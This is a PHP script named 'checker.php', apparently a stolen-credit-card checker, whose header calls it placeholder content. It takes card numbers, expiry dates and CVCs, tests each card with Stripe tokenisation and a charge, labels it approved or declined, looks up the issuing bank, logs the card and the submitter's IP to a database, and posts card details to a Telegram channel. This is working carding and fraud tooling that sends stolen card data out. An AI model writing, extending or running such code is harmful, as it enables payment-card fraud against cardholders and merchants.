// checker.php - placeholder content for demonstration.
// checker.php - placeholder content for demonstration.
<?php
require 'config.php';
require 'functions/stripe.php';
require 'functions/log.php';
require 'functions/telegram.php';

$config = require 'config.php';
$mysqli = new mysqli(
    $config['db']['host'],
    $config['db']['user'],
    $config['db']['pass'],
    $config['db']['name']
);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card = [
        'number' => $_POST['number'],
        'exp_month' => $_POST['exp_month'],
        'exp_year' => $_POST['exp_year'],
        'cvc' => $_POST['cvc']
    ];
    $ip = $_SERVER['REMOTE_ADDR'];
    $sk = $config['stripe_sk'];

    // Step 1: Create Stripe token
    $token_data = createStripeToken($card, $sk);
    if (isset($token_data['error'])) {
        echo json_encode(['status' => 'error', 'message' => $token_data['error']['message']]);
        logToDB($mysqli, $card, 'DECLINED', binLookup($card['number']), $ip);
        exit;
    }

    $token = $token_data['id'];

    // Step 2: Charge
    $charge = chargeTest($token, $sk);
    $status = isset($charge['status']) && $charge['status'] == 'succeeded' ? 'APPROVED' : 'DECLINED';

    // Step 3: BIN lookup
    $bininfo = binLookup($card['number']);

    // Step 4: Log to DB
    logToDB($mysqli, $card, $status, $bininfo, $ip);

    // Step 5: Telegram Alert
    $msg = "💳 " . $card['number'] . " | " . $card['exp_month'] . "/" . $card['exp_year'] . "\n"
         . "💼 Bank: " . $bininfo['bank'] . "\n"
         . "🌍 " . $bininfo['country'] . "\n"
         . "⚙️ Status: $status\n"
         . "🔗 IP: $ip";
    sendTelegram($msg, $config);

    echo json_encode(['status' => $status]);
}

function binLookup($number) {
    $bin = substr($number, 0, 6);
    $res = file_get_contents("https://lookup.binlist.net/$bin");
    $json = json_decode($res, true);
    return [
        'bin' => $bin,
        'brand' => $json['scheme'] ?? 'Unknown',
        'bank' => $json['bank']['name'] ?? 'Unknown',
        'country' => $json['country']['name'] ?? 'Unknown'
    ];
}
?>
